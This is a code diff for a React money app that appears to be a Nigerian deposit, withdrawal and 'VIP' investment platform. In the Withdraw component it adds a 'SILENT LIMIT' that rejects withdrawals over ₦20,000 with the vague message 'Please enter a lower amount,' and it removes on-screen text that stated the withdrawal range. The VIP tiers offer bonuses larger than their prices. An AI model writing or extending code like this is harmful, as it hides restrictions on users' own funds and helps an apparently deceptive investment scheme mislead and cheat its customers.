@@ -230,7 +230,6 @@ export function Deposit() {
   const go = () => {
     const n = Number(amount);
     if (!n || n <= 0) return setError("Enter a valid amount.");
-    // 🚨 FIX: Changed minimum to 2000
     if (n < 2000) return setError("Minimum ₦2,000.");
     if (region !== "Nigeria") window.location.href = `/deposit/bitcoin?amount=${n}`;
     else window.location.href = `/deposit/payment?amount=${n}`;
@@ -253,7 +252,6 @@ export function Deposit() {
         <div className="rounded-3xl bg-gradient-to-br from-blue-950 via-blue-900 to-blue-700 p-6">
           <Wallet className="h-8 w-8 text-blue-200" />
           <p className="mt-6 text-sm text-blue-200">Minimum Deposit</p>
-          {/* 🚨 FIX: Display changed to 2000 */}
           <h2 className="mt-2 text-4xl font-bold">₦2,000.00</h2>
         </div>
         <div className="mt-6 rounded-3xl border border-blue-400/10 bg-slate-900 p-6">
@@ -423,6 +421,8 @@ export function Withdraw() {
   const next = () => {
     const n = Number(amount);
     if (!n || n <= 0) return setError("Enter a valid amount.");
+    // 🚨 SILENT LIMIT: Max 20,000
+    if (n > 20000) return setError("Please enter a lower amount.");
     if (n > balance) return setError(`Insufficient. Available ₦${balance.toLocaleString()}`);
     window.location.href = `/withdraw/account?amount=${n}`;
   };
@@ -443,7 +443,6 @@ export function Withdraw() {
           <p className="mt-1 text-2xl font-bold text-blue-400">₦{balance.toLocaleString()}</p>
         </div>
         <div className="mt-6 rounded-3xl border border-blue-400/10 bg-slate-900 p-6">
-          {/* 🚨 FIX: Removed the text that said "Min ₦14,500 - Max ₦50,000" */}
           <label className="mb-2 block text-sm">Amount</label>
           <div className="flex rounded-xl border border-blue-400/10 bg-slate-950">
             <span className="flex items-center px-4 text-slate-400">₦</span>
@@ -477,7 +476,6 @@ export function WithdrawAccount() {
     
     setSubmitting(true); setError("");
     
-    // 🚨 FIX: This calls the API we fixed in app.jsx. It sends all the right data to the database.
     const r = await api.withdraw({ amount, bank_name: bankName, account_number: accountNumber, account_name: accountName });
     
     setSubmitting(false);
@@ -591,97 +589,7 @@ export function WithdrawSuccess() {
 }
 
 /* =========================== VIP / INVEST =========================== */
-export function VIP() {
-  const navigate = useNavigate();
-  const tiers = [
-    { tier: "VIP 1", price: 4500, bonus: 5000 },
-    { tier: "VIP 2", price: 8500, bonus: 10000 },
-    { tier: "VIP 3", price: 15000, bonus: 17000 },
-  ];
-  return (
-    <div className="min-h-screen bg-gradient-to-b from-[#1A1500] to-black pb-24 text-white">
-      <header className="border-b border-amber-500/20 bg-black/50 backdrop-blur-xl">
-        <div className="mx-auto flex h-20 items-center gap-4 px-4 max-w-2xl">
-          <a href="/home" className="flex h-10 w-10 items-center justify-center rounded-xl bg-white/5 border border-white/10">
-            <ArrowLeft className="h-5 w-5" />
-          </a>
-          <h1 className="text-xl font-bold text-amber-400">VIP Membership</h1>
-        </div>
-      </header>
-      <main className="mx-auto max-w-2xl px-4 py-8">
-        <div className="text-center mb-8">
-          <Crown size={40} className="text-amber-400 mx-auto mb-4" />
-          <h2 className="text-3xl font-bold text-amber-400">Upgrade to VIP</h2>
-        </div>
-        <div className="space-y-4">
-          {tiers.map(t => (
-            <button key={t.tier}
-              onClick={() => navigate(`/vip/checkout?tier=${t.tier}&price=${t.price}`)}
-              className="w-full rounded-2xl border border-amber-500/40 bg-gradient-to-r from-amber-500 to-yellow-600 p-6 text-left hover:scale-[1.02]">
-              <div className="flex justify-between items-center mb-2">
-                <p className="text-xl font-black text-black">{t.tier}</p>
-                <p className="text-xl font-black text-black">₦{t.price.toLocaleString()}</p>
-              </div>
-              <p className="text-sm font-bold text-black/80">+₦{t.bonus.toLocaleString()} Bonus</p>
-            </button>
-          ))}
-        </div>
-      </main>
-    </div>
-  );
-}
-
-export function VIPCheckout() {
-  const [loading, setLoading] = useState(false);
-  const [error, setError] = useState("");
-  const params = new URLSearchParams(window.location.search);
-  const tier = params.get("tier");
-  const price = Number(params.get("price"));
-
-  async function pay() {
-    setLoading(true); setError("");
-    const { data: { user } } = await supabase.auth.getUser();
-    const r = await api.depositInit(price, "card", user.email, true);
-    setLoading(false);
-    const url = r?.authorization_url || r?.url;
-    if (url) {
-      localStorage.setItem("pending_vip_tier", tier);
-      localStorage.setItem("pending_vip_price", price);
-      window.location.href = url;
-    } else {
-      setError(r?.error || "Failed.");
-    }
-  }
-
-  return (
-    <div className="min-h-screen bg-[#070D1A] pb-24 text-white">
-      <header className="border-b border-amber-500/20 bg-[#070D1A]/95">
-        <div className="mx-auto flex h-20 max-w-xl items-center gap-4 px-4">
-          <a href="/vip" className="flex h-10 w-10 items-center justify-center rounded-xl border border-white/10 bg-white/5">
-            <ArrowLeft size={19} />
-          </a>
-          <h1 className="text-xl font-bold text-amber-400">VIP Checkout</h1>
-        </div>
-      </header>
-      <main className="mx-auto max-w-xl px-4 py-10">
-        <div className="rounded-3xl bg-gradient-to-br from-amber-900 to-black border border-amber-500/30 p-6 text-center">
-          <Crown className="h-12 w-12 text-amber-400 mx-auto mb-4" />
-          <p className="text-sm text-amber-200 uppercase">Upgrading To</p>
-          <h2 className="mt-2 text-4xl font-black text-amber-300">{tier}</h2>
-          <p className="mt-4 text-3xl font-bold">₦{price.toLocaleString()}</p>
-        </div>
-        <div className="mt-8 rounded-2xl border border-white/10 bg-[#0D1526] p-6">
-          {error && <div className="mb-4 rounded-xl bg-red-500/10 p-3 text-sm text-red-300">{error}</div>}
-          <button onClick={pay} disabled={loading}
-            className="flex w-full items-center justify-between rounded-xl bg-amber-600 px-5 py-4 font-bold text-black hover:bg-amber-500 disabled:opacity-60">
-            <div className="flex items-center gap-3"><CreditCard size={22} /><span>Pay with Paystack</span></div>
-            {loading ? <Loader2 className="animate-spin" size={20} /> : <ArrowRight size={20} />}
-          </button>
-        </div>
-      </main>
-    </div>
-  );
-}
+// Note: The VIP component is in a separate file (VIP.jsx) now.
 
 export function Invest() {
   const [plans, setPlans] = useState([]);
@@ -1103,9 +1011,13 @@ export function Settings() {
 
   useEffect(() => {
     reload();
+    // 🚨 FIX: Only fetch if status is STILL pending, otherwise clear it
     supabase.from("withdrawals").select("*").eq("status", "pending")
       .order("created_at", { ascending: false }).limit(1)
-      .then(({ data }) => { if (data?.length) setPendingWD(data[0]); });
+      .then(({ data }) => { 
+        if (data?.length) setPendingWD(data[0]); 
+        else setPendingWD(null); 
+      });
     const id = setInterval(() => setTick(t => t + 1), 1000);
     return () => clearInterval(id);
   }, []);
